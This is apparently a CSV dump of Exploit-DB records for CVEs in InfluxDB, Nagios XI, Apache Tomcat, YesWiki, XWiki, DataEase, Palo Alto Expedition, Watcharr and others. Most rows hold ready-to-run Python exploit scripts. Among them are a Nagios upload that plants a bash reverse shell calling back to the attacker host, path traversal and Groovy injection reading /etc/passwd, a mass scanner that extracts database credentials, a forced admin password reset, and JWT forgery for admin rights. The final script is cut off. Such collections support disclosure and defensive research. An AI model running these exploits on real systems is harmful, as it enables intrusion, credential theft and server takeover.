CVE-2024-30896,"{""CVE-2024-30896"": 1}",2025-04-08,InfluxDB OSS 2.7.11 - Operator Token Privilege Escalation,https://www.exploit-db.com/exploits/52142,"Exploit Title: InfluxDB OSS Operator Privilege Escalation via BusinessLogic Flaw Date: 22/03/2024 Exploit Author: Andrea Pasin (Xenom0rph97) Researcher Homepage: <URL> GitHub Exploit repo: <URL> Software Link: <URL> Version: 2.x <=> 2.7.11 Tested on: InfluxDB OSS 2.x CVE: CVE-2024-30896 CVSS Base Score: 9.1 CVSS v3.1 Vector: AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H CVE-2024-30896 #Summary A business logic flaw in influxdb allows users who own a valid allAccess token to escalate their privileges at operator level by listing current authorization tokens. #Scenario Attacker might be a user which was gained access by an administrator via an allAccess token only within their organization. This user's permissions will allow full control over the organization but will still prevent him to interact with other orgs. #Impact This vulnerability would allow a user to obtain unrestricted access to the influxdb instance. A similar condition might fully compromise Confidentiality, Integrity and Availability of data owned by users of different organizations. Additionally, since operator token has administrative permissions, Availability and Integrity of the entire influxdb instance might be compromised. #Prerequisites/Limitations 1. Attacker must have a valid allAccess token 2. allAccess token must have been created in the same Org where an operator token resides (ex. same Org as Admin user) 3. Attacker must be able to interact with influxdb instance via CLI or APIs (influxClient) #Steps to Reproduce Case 1: Exploitation via influxdb APIs: Python Version: 3 Requirements: influxdb_client==1.41.0 Script usage % python3 ./CVE-2024-30896.py -h usage: CVE-2024-30896.py [-h] [-t TOKEN] [-e ENDPOINTURL] [-v [VERBOSE]] [-vv [VVERBOSE]] optional arguments: -h, --help show this help message and exit -t TOKEN, --token TOKEN Custom or allAccess token to access influx DB instance -e ENDPOINTURL, --endpointUrl ENDPOINTURL Endpoint Url of influxdb instance (ex. "" <URL> -v [VERBOSE], --verbose [VERBOSE] Enable verbose logging - INFO -vv [VVERBOSE], --vverbose [VVERBOSE] Enable verbose logging - DEBUG Case 2: Exploitation via influx CLI 1. Execute: influx auth ls -t | grep write:/orgs. This will list all current active operator tokens on the influxdb instance. Example Using an allAccess token influx auth ls -t U1OuqmFC{REDACTED} | grep U1OuqmFC{REDACTED} 0cc41c3b050e5000 U1OuqmFC{REDACTED} admin 0cb9c92ee228b000 [read:orgs/87d0746948a3b3f5/authorizations write:orgs/87d0746948a3b3f5/authorizations read:orgs/87d0746948a3b3f5/buckets write:orgs/87d0746948a3b3f5/buckets read:orgs/87d0746948a3b3f5/dashboards write:orgs/87d0746948a3b3f5/dashboards read:/orgs/87d0746948a3b3f5 read:orgs/87d0746948a3b3f5/sources write:orgs/87d0746948a3b3f5/sources read:orgs/87d0746948a3b3f5/tasks write:orgs/87d0746948a3b3f5/tasks read:orgs/87d0746948a3b3f5/telegrafs write:orgs/87d0746948a3b3f5/telegrafs read:/users/0cb9c92ee228b000 write:/users/0cb9c92ee228b000 read:orgs/87d0746948a3b3f5/variables write:orgs/87d0746948a3b3f5/variables read:orgs/87d0746948a3b3f5/scrapers write:orgs/87d0746948a3b3f5/scrapers read:orgs/87d0746948a3b3f5/secrets write:orgs/87d0746948a3b3f5/secrets read:orgs/87d0746948a3b3f5/labels write:orgs/87d0746948a3b3f5/labels read:orgs/87d0746948a3b3f5/views write:orgs/87d0746948a3b3f5/views read:orgs/87d0746948a3b3f5/documents write:orgs/87d0746948a3b3f5/documents read:orgs/87d0746948a3b3f5/notificationRules write:orgs/87d0746948a3b3f5/notificationRules read:orgs/87d0746948a3b3f5/notificationEndpoints write:orgs/87d0746948a3b3f5/notificationEndpoints read:orgs/87d0746948a3b3f5/checks write:orgs/87d0746948a3b3f5/checks read:orgs/87d0746948a3b3f5/dbrp write:orgs/87d0746948a3b3f5/dbrp read:orgs/87d0746948a3b3f5/notebooks write:orgs/87d0746948a3b3f5/notebooks read:orgs/87d0746948a3b3f5/annotations write:orgs/87d0746948a3b3f5/annotations read:orgs/87d0746948a3b3f5/remotes write:orgs/87d0746948a3b3f5/remotes read:orgs/87d0746948a3b3f5/replications write:orgs/87d0746948a3b3f5/replications] Listing all available tokens passing allAccess token and retrieving only operator level tokens influx auth ls -t U1OuqmFC{REDACTED} | grep write:/orgs 0cbb920e128e5000 gerKYLO0PhibUk0y{REDACTED} admin 0cb9c92ee228b000 [read:/authorizations write:/authorizations read:/buckets write:/buckets read:/dashboards write:/dashboards read:/orgs write:/orgs read:/sources write:/sources read:/tasks write:/tasks read:/telegrafs write:/telegrafs read:/users write:/users read:/variables write:/variables read:/scrapers write:/scrapers read:/secrets write:/secrets read:/labels write:/labels read:/views write:/views read:/documents write:/documents read:/notificationRules write:/notificationRules read:/notificationEndpoints write:/notificationEndpoints read:/checks write:/checks read:/dbrp write:/dbrp read:/notebooks write:/notebooks read:/annotations write:/annotations read:/remotes write:/remotes read:/replications write:/replications] influxdbclient==1.41.0 import influxdbclient import argparse import logging import sys argParser = argparse.ArgumentParser() argParser.addargument(""-t"", ""--token"", type=str, help=""Custom or allAccess token to access influx DB instance"") argParser.addargument(""-e"", ""--endpointUrl"", type=str, help=""Endpoint Url of influxdb instance (ex. \"" <URL> argParser.addargument(""-v"", ""--verbose"", type=bool, const=True, nargs='?', help=""Enable verbose logging - INFO"") argParser.addargument(""-vv"", ""--vverbose"", type=bool, const=True, nargs='?', help=""Enable verbose logging - DEBUG"") args = argParser.parseargs() Using user retrieved values or default (hardcoded) ones allaccesstoken = "" "" influxendpointurl = "" "" Defining some colors red = ""\033[31m"" yellow = ""\033[93m"" purple = ""\33[1;95m"" green = ""\033[0;92m"" cyan = ""\033[96m"" bold =""\033[1m"" endc = ""\033[39m"" if args.vverbose == True: logging.basicConfig(level=logging.DEBUG) elif args.verbose == True: logging.basicConfig(level=logging.INFO) logger = logging.getLogger() if args.token: token = args.token else: logger.debug(f""{yellow}User did not set a token, using default one{endc}"") token = allaccesstoken if args.endpointUrl: endpointUrl = args.endpointUrl else: logger.debug(f""{yellow}User did not set an endpoint Url for influxdb, using default one{endc}"") endpointUrl = influxendpointurl logger.info(f""{cyan}Connecting to influx DB instance{endc}"") Connecting to influxdb instance try: conn = influxdbclient.InfluxDBClient( url=endpointUrl, token=token, debug=False, verifyssl=True Verify InfluxDB connection health = conn.ping() if not health: logger.error(f""{red}Unable to connect to db instace "" + endpointUrl + f""{endc}"") print(f""{red}Quitting execution.{endc}"") sys.exit(1) except Exception as e: logger.error(f""{red}Failed to connect to db instance: "" + endpointUrl + "" Error: "" + str(e) + f""{endc}"") print(f""{red}Quitting execution.{endc}"") sys.exit(1) Retrieving all current auths logger.debug(f""{yellow}Retrieving all auth tokens{endc}"") print(f""{cyan}Enumerating current authorizations.{endc}"") try: auths = conn.authorizationsapi().findauthorizations() except Exception as e: logger.error(f""{red}Unable to retrieve authorizations. ERR: "" + str(e) +f""{endc}"") print(f""{red}Unable to retrieve authorizations. Quitting.{endc}"") sys.exit(1) if not auths: print(f""{cyan}No Authorization tokens found on the instance{endc}"") sys.exit(1) print(f""{cyan}{str(len(auths))} tokens found on the instance{endc}\n"") Extracting operator token -> Parsing permissions to look for (""org = None"" and ""authType = write/auths""), not 100% efficiency -> TO OPTIMIZE logger.debug(f""{yellow}Parsing auth permissions to retrieve operator tokens{endc}"") print(f""{cyan}Enumerating all operator tokens:{endc}"") optokens = [] In order to understand if a token is of type ""operator"" we need to enumerate all permissions and look for ""write/auths"" on org 'None' -> Unrescticted access try: for auth in auths: if auth.permissions: for perm in auth.permissions: if perm.action == ""write"" and perm.resource.org == None and perm.resource.type == ""authorizations"": optokens.append(auth.token) except Exception as e: logger.error(f""{red}Unable to parse permissions on found authorizations. ERR: "" + str(e) + f""{endc}"") print(f""{red}Unable to parse permissions on found authorizations. Quitting execution.{endc}"") sys.exit(1) logger.info(f""{cyan}Printing all operator auth tokens{endc}"") print(f""{cyan}{str(len(optokens))} operator tokens found.\n\nListing all operator tokens:\n{endc}"") for opt in optokens: print(f""{green}{opt}{endc}"")"
CVE-2024-23922,"{""CVE-2024-23922"": 1}",2025-04-08,Sony XAV-AX5500 1.13 - Firmware Update Validation Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52143,"Exploit Title: Sony XAV-AX5500 Firmware Update Validation Remote Code Execution Date: 11-Feb-2025 Exploit Author: lkushinada Vendor Homepage: <URL> Software Link: <URL> Version: 1.13 Tested on: Sony XAV-AX5500 CVE : CVE-2024-23922 From NIST CVE Details: This vulnerability allows physically present attackers to execute arbitrary code on affected installations of Sony XAV-AX5500 devices. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of software updates. The issue results from the lack of proper validation of software update packages. An attacker can leverage this vulnerability to execute code in the context of the device. Was ZDI-CAN-22939 # Summary Sony's firmware validation for a number of their XAV-AX products relies on symetric cryptography, obscurity of their package format, and a weird checksum method instead of any real firmware signing mechanism. As such, this can be exploited to craft updates which bypass firmware validation and allow a USB-based attacker to obtain RCE on the infotainment unit. What's not mentioned in the CVE advisories, is that this method works on the majority of Sony's infotainment units and products which use a similar chipset or firmware package format. Tested to work on most firmware versions prior to v2.00. # Threat Model An attacker with physical access to an automotive media unit can typically utilize other methods to achieve a malicious outcome. The reason to investigate the firmware to the extent in this post is academic, exploratory, and cautionary, i.e. what other systems are protected in a similar manner? if they are, how trivial is it to bypass? # Disclaimer The information in this article is for educational purposes only. Tampering with an automotive system comes with risks which, if you don't understand, you should not be undertaking. THE AUTHORS DISCLAIM ANY AND ALL RESPONSIBILITY FOR CONSEQUENTIAL OR INCIDENTAL DAMAGES ARISING FROM THE USE OF ANYTHING IN THIS DOCUMENT. # The Unit # #Processors # - DAC # - System Management Controller (SMC) # - Applications Processor # - Display Processor Coming from a mobile and desktop computer environment, one may be use to thinking about the Applications Processor as the most powerful chip in the system in terms of processing power, size, power consumption, and system hierarchy. The first oddity of this platform is that the application processor is not the most powerful; that honor goes to the DAC, a beefy ARM chip on the board. The application processor does not appear to be the orchestrator of the components on the system. The SMC tkes which takes the role of watchdog, power state management, and input (think remote controls, steering wheel button presses) routing. For our purposes, it is the Applications processor we're interested in, as it is the system responsible for updating the unit via USB. # #Interfaces We're going to be attacking the unit via USB, as it's the most readily exposed interface to owners and would-be attackers. Whilst the applications processor does have a UART interface, the most recent iterations of the unit do not expose any headers for debugging via UART, and the one active UART line found to be active was for message passing between the SMC and app processor, not debug purposes. Similarly, no exposed JTAG interfaces were found to be readily exposed on recent iterations of the unit. Sony's documentation suggests these are not enabled, but this could not be verified during testing. At the very least, JTAG was not found to be exposed on an accessible interface. # #Storage The boards analyzed had two SPI NOR flash chips, one with an unencrypted firmware image on it. This firmware was RARd. The contents of SPI flash was analyzed to determine many of the details discussed in this report. # #The Updater Updates are provided on Sony's support website. A ZIP package is provided with three files: # - SHDS1132.up6 # - SHMC1132.u88 # - SHSO1132.fir The largest of these files (8 meg), the .fir, is in a custom format, and appears encrypted. The FIR file has a header which contains the date of firmware publication, the strings KRSELCO and SKIP, a chunk of zeros, and then a highish entropy section, and some repeating patterns of interest: 00002070 b7 72 10 03 00 8c 82 7e aa d1 83 58 23 ef 82 5c |.r.~.X#..\| 00002860 b7 72 10 03 00 8c 82 7e aa d1 83 58 23 ef 82 5c |.r.~.X#..\| 00744110 b7 72 10 03 00 8c 82 7e aa d1 83 58 23 ef 82 5c |.r.~.X#..\| 00800020 b7 72 10 03 00 8c 82 7e aa d1 83 58 23 ef 82 5c |.r.~.X#..\| # #SPI Flash Dumping the contents of the SPI flash shows a similar layout, with slightly different offsets: 00001fe0 10 10 10 10 10 10 10 10 ff ff ff ff ff ff ff ff |.| 00001ff0 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |.| 000027f0 ff ff ff ff ff ff ff ff ff ff ff ff 00 03 e7 52 |.R| 00002800 52 61 72 21 1a 07 00 cf 90 73 00 00 0d 00 00 00 |Rar!.s.| 0007fff0 ff ff ff ff ff ff ff ff ff ff ff ff 00 6c 40 8b |.l@.| 00080000 52 61 72 21 1a 07 00 cf 90 73 00 00 0d 00 00 00 |Rar!.s.| 00744090 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |.| 00778000 This given the offsets and spacing, we suspect that the .FIR matches the contents of the SPI. Decompressing the RARs at the 0x2800 and 0x80000, we get the recovery and main applications. Once we remove the packaging bytes, seeing that the repetive patterns align with FF's, gives us a strong indication the encryption function is operating in an ECB-style configuration, giving us an avenue, even if we do not recover the key, to potentially make modifications to the firmware depending on how the checksum is being calculated. # #Firmware The recovery application contains the decompression, decryption and checksum methods. Putting the recovery_16.bin into ghidra and setting the memory map to load us in at 0x2800, we start taking a look at the relevant functions by way of: # - looking for known strings (KRSELCO) # - analyizing the logic and looking for obvious ""if this passed, begin the update, else fail"" # - looking for things that look like encryption (loads of bitshifting math in one function) Of interest to us, there is: # - 0x0082f4 - a strcmp between KRSELCO and the address the incoming firmware update is at, plus 0x10 # - 0x00897a - a function which sums the total number of bytes until we hit 0xA5A5A5A5 # - 0x02d4ce - the AES decryption function # - 0x040dd4 - strcmp (?) # - 0x040aa4 - memcpy (?) # - 0x046490 - the vendor plus the a number an idiot would use for their luggage, followed by enough padding zeros to get us to a 16 byte key This gives us all the information we need, other than making some guesses as to the general package and header layout of the update package, to craft an update packager that allows arbitrary modification of the firmware. # Proof of Concept The"
CVE-2019-15949,"{""CVE-2019-15949"": 1}",2025-04-08,Nagios Xi 5.6.6 - Authenticated Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52138,"Exploit Title: Nagiosxi authenticated Remote Code Execution Date: 17/02/2024 Exploit Author: Calil Khalil Vendor Homepage: <URL> Version: Nagios Xi 5.6.6 Tested on: Ubuntu CVE : CVE-2019-15949 python3 exp.py -t <URL> -b / / -u user -p 'password' -lh -lp -k (ignore cert) import argparse import re import requests import urllib3 class Nagiosxi(): def init(self, target, parameter, username, password, lhost, lport, ignoressl): self.url = target self.parameter = parameter self.username = username self.password = password self.lhost = lhost self.lport = lport self.ignoressl = ignoressl self.login() def upload(self, session): print(""Uploading Malicious Check Ping Plugin"") uploadurl = self.url + self.parameter + ""/admin/monitoringplugins.php"" uploadtoken = session.get(uploadurl, verify=not self.ignoressl) nsp = re.findall('var nspstr = ""(.)"";', upload_token.text) print(""Upload NSP Token: "" + nsp[0]) payload = ""bash -c 'bash -i >& /dev/tcp/"" + self.lhost + ""/"" + self.lport + "" 0>&1'"" file_data = { ""upload"": ""1"", ""nsp"": nsp[0], ""MAX_FILE_SIZE"": ""20000000"" file_upload = { ""uploadedfile"": (""check_ping"", payload, ""application/octet-stream"", {""Content-Disposition"": ""form-data""}) session.post(upload_url, data=file_data, files=file_upload, verify=not self.ignore_ssl) payload_url = self.url + self.parameter + ""/includes/components/profile/profile.php?cmd=download"" session.get(payload_url, verify=not self.ignore_ssl) def login(self): session = requests.Session() login_url = self.url + self.parameter + ""/login.php"" token = session.get(login_url, verify=not self.ignore_ssl) nsp = re.findall('name=""nsp"" value=""(.)"">', token.text) print(""Login NSP Token: "" + nsp[0]) postdata = { ""nsp"": nsp[0], ""page"": ""auth"", ""debug"": """", ""pageopt"": ""login"", ""redirect"": """", ""username"": self.username, ""password"": self.password, ""loginButton"": """" login = session.post(loginurl, data=postdata, verify=not self.ignoressl) if ""Home Dashboard"" in login.text: print(""Logged in!"") else: print(""Unable to login!"") self.upload(session) if name == ""main"": parser = argparse.ArgumentParser(description='CVE-2019–15949 Nagiosxi authenticated Remote Code Execution') parser.addargument('-t', metavar=' ', help='Example: -t <URL> required=True) parser.addargument('-b', metavar=' ', help=""Example: -b /nagiosxi/"", required=True) parser.addargument('-u', metavar=' ', help=""Example: -a username"", required=True) parser.addargument('-p', metavar=' ', help=""Example: -p 'password'"", required=True) parser.addargument('-lh', metavar=' ', help=""Example: -lh 127.0.0.1"", required=True) parser.addargument('-lp', metavar=' ', help=""Example: -lp 1337"", required=True) parser.addargument('-k', action='storetrue', help=""Ignore SSL certificate verification"") args = parser.parseargs() urllib3.disablewarnings() try: print('CVE-2019-15949 Nagiosxi authenticated Remote Code Execution') Nagiosxi(args.t, args.b, args.u, args.p, args.lh, args.lp, args.k) except KeyboardInterrupt: print(""\nBye Bye!"") exit()"
CVE-2020-7656,"{""CVE-2020-7656"": 1}",2025-04-08,jQuery 3.3.1 - Prototype Pollution &amp; XSS Exploit,https://www.exploit-db.com/exploits/52141,"Exploit Title: jQuery Prototype Pollution & XSS Exploit (CVE-2019-11358 & CVE-2020-7656) Google Dork: N/A Date: 2025-02-13 Exploit Author: xOryus Vendor Homepage: <URL> Software Link: <URL> Version: 3.3.1 Tested on: Windows 10, Ubuntu 20.04, Chrome 120, Firefox 112 CVE : CVE-2019-11358, CVE-2020-7656 Category: WebApps Description: This exploit abuses two vulnerabilities in jQuery: # - CVE-2020-7656: XSS via improper script handling # - CVE-2019-11358: Prototype Pollution leading to XSS By injecting payloads into a vulnerable page using jQuery <3.4.X, attackers can execute arbitrary JavaScript in the victim's browser. Usage: 1. Load this script in a page that includes jQuery 3.3.1 2. Observe two XSS alerts via script injection and prototype pollution."
CVE-2024-56902,"{""CVE-2024-56902"": 1}",2025-04-08,GeoVision GV-ASManager 6.1.0.0  - Information Disclosure,https://www.exploit-db.com/exploits/52144,"Exploit Title: Information Disclosure in GeoVision GV-ASManager Google Dork: inurl:""ASWeb/Login"" Date: 02-FEB-2025 Exploit Author: Giorgi Dograshvili [DRAGOWN] Vendor Homepage: <URL> Software Link: <URL> Version: 6.1.0.0 or less Tested on: Windows 10 | Kali Linux CVE : CVE-2024-56902"
CVE-2025-24813,"{""CVE-2025-24813"": 1}",2025-04-07,Apache Tomcat 11.0.3 - Remote Code Execution,https://www.exploit-db.com/exploits/52134,"Exploit Title: Apache Tomcat Path Equivalence - Remote Code Execution Exploit Author: Al Baradi Joy CVE: CVE-2025-24813 Date: 2025-04-06 Vendor Homepage: <URL> Software Link: <URL> Version: Apache Tomcat < 11.0.3 / 10.1.35 / 9.0.98 Tested on: Apache Tomcat 10.1.33 CVSS: 9.8 (CRITICAL) CWE: CWE-44, CWE-502 Reference: <URL> import requests import random import string import sys def randfilename(length=6): return ''.join(random.choices(string.asciilowercase, k=length)) def generatepayload(interacturl): Java serialized payload gadget triggering DNS interaction return f'\xac\xed\x00\x05.' Replace with actual gadget bytes or generator def exploit(target, interacturl): filename = randfilename() puturl = f""{target}/{filename}.session"" geturl = f""{target}/{filename}"" headers = { ""Content-Range"": ""bytes 0-452/457"", ""Content-Type"": ""application/octet-stream"" payload = generatepayload(interacturl) print(""[+] Exploit for CVE-2025-24813"") print(""[+] Made By Al Baradi Joy\n"") print(f""[+] Uploading payload to: {puturl}"") r1 = requests.put(puturl, data=payload, headers=headers) if r1.statuscode == 201: print(""[+] Payload uploaded successfully."") else: print(f""[-] Upload failed with status: {r1.statuscode}"") return print(f""[+] Triggering payload via: {geturl}"") cookies = {""JSESSIONID"": f"".{filename}""} r2 = requests.get(geturl, cookies=cookies) print(f""[+] Trigger request sent. Check for DNS callback to: {interacturl}"") if name == ""main"": Display banner first print(""[+] Exploit for CVE-2025-24813"") print(""[+] Made By Al Baradi Joy\n"") Ask the user for the target domain and interact URL targeturl = input(""Enter the target domain (e.g., <URL> interacturl = input(""Enter your interactsh URL: "") exploit(targeturl, interact_url)"
CVE-2025-31131,"{""CVE-2025-31131"": 1}",2025-04-07,YesWiki 4.5.1 - Unauthenticated Path Traversal,https://www.exploit-db.com/exploits/52135,"Exploit Title: YesWiki < 4.5.2 - Unauthenticated Path Traversal Exploit Author: Al Baradi Joy Exploit Date: April 6, 2025 CVE ID: CVE-2025-31131 Vendor Homepage: <URL> Software Link: <URL> Affected Version: < 4.5.2 Tested On: YesWiki 4.5.1 on Ubuntu 22.04 Vulnerability Type: Unauthenticated Path Traversal (LFI) CVSS Score: 8.6 (High) CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N Description: YesWiki before version 4.5.2 is vulnerable to unauthenticated path traversal via the 'squelette' parameter. A remote attacker can exploit this issue to read arbitrary files on the server, such as /etc/passwd. import requests import sys def banner(): print(""="" 80) print("" YesWiki < 4.5.2 - Unauthenticated Path Traversal (CVE-2025-31131)"") print("" Exploit Author: Al Baradi Joy"") print(""="" 80) def exploit(target, filename=""/etc/passwd""): if not target.startswith(""http""): target = "" <URL> + target traversal = ""../"" * 8 encodedfile = filename.replace(""/"", ""%2f"") payload = f""/?UrkCEO/edit&theme=margot&squelette={traversal}{encodedfile}&style=margot.css"" url = target.rstrip(""/"") + payload try: print(f""[+] Target: {target}"") print(f""[+] Attempting to read: {filename}"") response = requests.get(url, timeout=10) if response.statuscode == 200 and ""root:"" in response.text: print(""[+] Exploit successful. File contents:\n"") print(response.text) else: print(""[!] Exploit failed or file not readable."") print(f""Status Code: {response.statuscode}"") if len(response.text) < 200: print(f""Response:\n{response.text}"") except requests.exceptions.RequestException as e: print(f""[!] Request failed: {e}"") if name == ""main"": banner() if len(sys.argv) < 2: print(f""Usage: python3 {sys.argv[0]} [filetoread]"") print(f""Example: python3 {sys.argv[0]} <URL> /etc/passwd"") sys.exit(1) targeturl = sys.argv[1] filetoread = sys.argv[2] if len(sys.argv) > 2 else ""/etc/passwd"" exploit(targeturl, filetoread)"
CVE-2025-24893,"{""CVE-2025-24893"": 1}",2025-04-07,XWiki Platform 15.10.10 - Remote Code Execution,https://www.exploit-db.com/exploits/52136,"Exploit Title: XWiki Platform - Remote Code Execution Exploit Author: Al Baradi Joy Exploit Date: April 6, 2025 CVE ID: CVE-2025-24893 Vendor Homepage: <URL> Software Link: <URL> Version: Affected versions up to and including XWiki 15.10.10 Tested Versions: XWiki 15.10.10 Vulnerability Type: Remote Code Execution (RCE) CVSS Score: 9.8 (Critical) CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Description: XWiki Platform suffers from a critical vulnerability where any guest user can execute arbitrary code remotely through the SolrSearch endpoint. This can lead to a full server compromise, including the ability to execute commands on the underlying system. The vulnerability impacts the confidentiality, integrity, and availability of the XWiki installation. The issue has been patched in XWiki versions 15.10.11, 16.4.1, and 16.5.0RC1. Proof of Concept: Yes Categories: XWiki, Remote Code Execution, CVE-2025, RCE References: # - GHSA Advisory: <URL> # - NVD CVE Details: <URL> # - GitHub Exploit Link: <URL> import requests Banner def displaybanner(): print(""=""*80) print(""Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution"") print(""Exploit Author: Al Baradi Joy"") print(""GitHub Exploit: <URL> print(""=""*80) Function to detect the target protocol (HTTP or HTTPS) def detectprotocol(domain): httpsurl = f"" <URL> httpurl = f"" <URL> try: response = requests.get(httpsurl, timeout=5, allowredirects=True) if response.statuscode < 400: print(f""[] Target supports HTTPS: {httpsurl}"") return httpsurl except requests.exceptions.RequestException: print(""[!] HTTPS not available, falling back to HTTP."") try: response = requests.get(httpurl, timeout=5, allowredirects=True) if response.statuscode < 400: print(f""[] Target supports HTTP: {httpurl}"") return httpurl except requests.exceptions.RequestException: print(""[] Target is unreachable on both HTTP and HTTPS."") exit(1) Exploit function def exploit(targeturl): targeturl = detectprotocol(targeturl.replace("" <URL> """").replace("" <URL> """").strip()) exploiturl = f""{targeturl}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"" try: print(f""[+] Sending request to: {exploiturl}"") response = requests.get(exploiturl, timeout=10) Check if the exploit was successful if response.statuscode == 200 and ""root:"" in response.text: print(""[] Exploit successful! Output received:"") print(response.text) else: print(f""[] Exploit failed. Status code: {response.statuscode}"") except requests.exceptions.ConnectionError: print(""[] Connection failed. Target may be down."") except requests.exceptions.Timeout: print(""[] Request timed out. Target is slow or unresponsive."") except requests.exceptions.RequestException as e: print(f""[] Unexpected error: {e}"") Main execution if name == ""main"": display_banner() target = input(""[?] Enter the target URL (without http/https): "").strip() exploit(target)"
CVE-2024-30269,"{""CVE-2024-30269"": 1}",2025-04-06,DataEase 2.4.0 - Database Configuration Information Exposure,https://www.exploit-db.com/exploits/52128,"Exploit Title: DataEase 2.4.0 - Database Configuration Information Exposure Shodan Dork: http.html:""dataease"" # FOFA Dork: body=""dataease"" && title==""DataEase"" # Exploit Author: ByteHunter # Email: 0xByteHunter.me # vulnerable Versions: 2.4.0-2.5.0 # Tested on: 2.4.0 # CVE : CVE-2024-30269 import argparse import requests import re import json from tqdm import tqdm def createvulnerabilitychecker(): vulnerablecount = 0 def checkvulnerability(url): nonlocal vulnerablecount endpoint = ""/de2api/engine/getEngine;.js"" fullurl = f""{url}{endpoint}"" headers = { ""Host"": url.split('/')[2], ""Accept-Encoding"": ""gzip, deflate, br"", ""Accept"": ""/"", ""Accept-Language"": ""en-US;q=0.9,en;q=0.8"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36"", ""Connection"": ""close"", ""Cache-Control"": ""max-age=0"" try: response = requests.get(fullurl, headers=headers, timeout=5) if response.statuscode == 200: try: jsondata = response.json() config = jsondata.get(""data"", {}).get(""configuration"", None) if config: configdata = json.loads(config) username = configdata.get(""username"") password = configdata.get(""password"") port = configdata.get(""port"") if username and password: vulnerablecount += 1 print(f""Vulnerable: {fullurl}"") print(f""Username: {username}"") print(f""Password: {password}"") if port is not None: print(f""Port Number: {port}"") except (json.JSONDecodeError, KeyError): print(f""Invalid JSON response from {fullurl}"") except requests.RequestException: pass return vulnerablecount return checkvulnerability def main(): parser = argparse.ArgumentParser(description=""CVE-2024-30269 DataEase Database Creds Extractor"") parser.addargument('-u', '--url', type=str, help='Single target') parser.addargument('-l', '--list', type=str, help='URL File List') args = parser.parseargs() checkvulnerability = createvulnerabilitychecker() if args.url: checkvulnerability(args.url) elif args.list: try: with open(args.list, 'r') as file: urls = [url.strip() for url in file.readlines() if url.strip()] totalurls = len(urls) for url in tqdm(urls, desc=""Processing URLs"", unit=""url""): checkvulnerability(url) tqdm.write(f""Vulnerable Instances: {checkvulnerability(url)}/{totalurls}"") except FileNotFoundError: print(f""File not found: {args.list}"") else: print(""provide a URL with -u or a file with -l."") if name == ""main"": main()"
CVE-2024-5910,"{""CVE-2024-5910"": 1}",2025-04-06,Palo Alto Networks Expedition 1.2.90.1 - Admin Account Takeover,https://www.exploit-db.com/exploits/52129,"Exploit Title: Palo Alto Networks Expedition 1.2.90.1 - Admin Account Takeover Shodan Dork: html:""expedition project"" # FOFA Dork: ""expedition project"" && iconhash=""1499876150"" # Exploit Author: ByteHunter # Email: 0xByteHunter.me # Vulnerable Versions: 1.2 < 1.2.92 # Tested on: 1.2.90.1 & 1.2.75 # CVE : CVE-2024-5910 import requests import argparse import warnings from requests.packages.urllib3.exceptions import InsecureRequestWarning warnings.simplefilter(""ignore"", InsecureRequestWarning) ENDPOINT = '/OS/startup/restore/restoreAdmin.php' def sendrequest(baseurl): url = f""{baseurl}{ENDPOINT}"" print(f""Testing URL: {url}"") try: response = requests.get(url, verify=False, timeout=7) if response.statuscode == 200: print(""✓ Admin password restored to: 'paloalto'\n"") print(""✓ admin panel is now accessable via ==> admin:paloalto creds"") else: print(f""Request failed with status code: {response.statuscode}\n"") except requests.exceptions.RequestException as e: print(f""Error sending request to {url}"") #{e} def main(): parser = argparse.ArgumentParser(description='Palo Alto Expedition - Admin Account Password Reset"
CVE-2024-48827,"{""CVE-2024-48827"": 1}",2025-04-06,Watcharr 1.43.0 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52130,"Exploit Title : Watcharr 1.43.0 - Remote Code Execution (RCE) CVE-2024-48827 exploit by Suphawith Phusanbai Affected Watcharr version 1.43.0 and below. import argparse import requests import json import jwt from pyfiglet import Figlet f = Figlet(font='slant',width=100) print(f.renderText('CVE-2024-48827')) store JWT token and UserID \ เก็บ token กับ UserID jwttoken = None userid = None login to obtain JWT token / ล็อคอินเพื่อรับ JWT Token def login(host, port, username, password): url = f' <URL> payload in login API request \ payload ใน json payload = { 'username': username, 'password': password headers = { 'Content-Type': 'application/json' login to obtain JWT token \ ล็อคอินเพิ่อเก็บ JWT token แล้วใส่ใน jwttoken object try: response = requests.post(url, data=json.dumps(payload), headers=headers) if response.statuscode == 200: token = response.json().get('token') if token: print(f""[+] SUCCESS! JWT Token: {token}"") global jwttoken jwttoken = token decode JWT token and store UserID in UserID object \ ดีโค้ด JWT token แล้วเก็บค่า UserID ใส่ใน UserID object decodedpayload = jwt.decode(token, options={""verifysignature"": False}) global userid userid = decodedpayload.get('userId') return token else: print(""[-] Check your password again!"") else: print(f""[-] Failed :("") print(f""Response: {response.text}"") except Exception as e: print(f""Error! HTTP response code: {e}"") craft the admin token(to make this work you need to know admin username) \ สร้าง admin JWT token ขึ้นมาใหม่โดยใช้ token ที่ล็อคอิน def createnewjwt(originaltoken): try: decodedpayload = jwt.decode(originaltoken, options={""verifysignature"": False}) userID = 1 is always the admin \ userID ลำดับที่ 1 คือ admin เสมอ decodedpayload['userId'] = 1 newtoken = jwt.encode(decodedpayload, '', algorithm='HS256') print(f""[+] New JWT Token: {newtoken}"") return newtoken except Exception as e: print(f""[-] Failed to create new JWT: {e}"") privilege escalation with the crafted JWT token \ PE โดยการใช้ crafted admin token def privilegeescalation(host, port, adminuser, token): specify API endpoint for giving users admin role \ เรียกใช้งาน API สำหรับให้สิทธิ์ user admin url = f' <URL> permission 3 givefull access privs you can also use 6 and 9 to gain partial admin privileges. \ ให้สิทธิ์ admin ทั้งหมดด้วย permission = 3 payload = { ""permissions"": 3 headers = { 'Authorization': f'{token}', 'Content-Type': 'application/json' try: response = requests.post(url, data=json.dumps(payload), 